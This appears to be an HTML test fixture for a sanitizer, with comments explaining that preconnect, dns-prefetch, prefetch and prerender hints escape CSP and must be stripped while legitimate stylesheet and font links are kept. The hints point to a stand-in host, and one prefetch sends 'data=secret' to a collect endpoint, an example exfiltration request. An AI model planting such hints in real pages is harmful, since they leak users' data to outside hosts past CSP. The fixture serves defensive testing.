<!doctype html>
<html>
  <head>
    <!-- Connection/prefetch resource hints that browsers do not consistently subject
         to CSP. They must be removed at the sanitizer layer. -->
    <link rel="preconnect" href="https://attacker.example">
    <link rel="dns-prefetch" href="https://attacker.example">
    <link rel="prefetch" href="https://attacker.example/collect?data=secret">
    <link rel="prerender" href="https://attacker.example/page">
    <!-- Legitimate links governed by CSP directives must survive. -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/example.css">
    <link rel="preload" as="font" href="https://fonts.gstatic.com/x.woff2">
    <link rel="icon" href="data:,">
  </head>
  <body><p>resource hints</p></body>
</html>
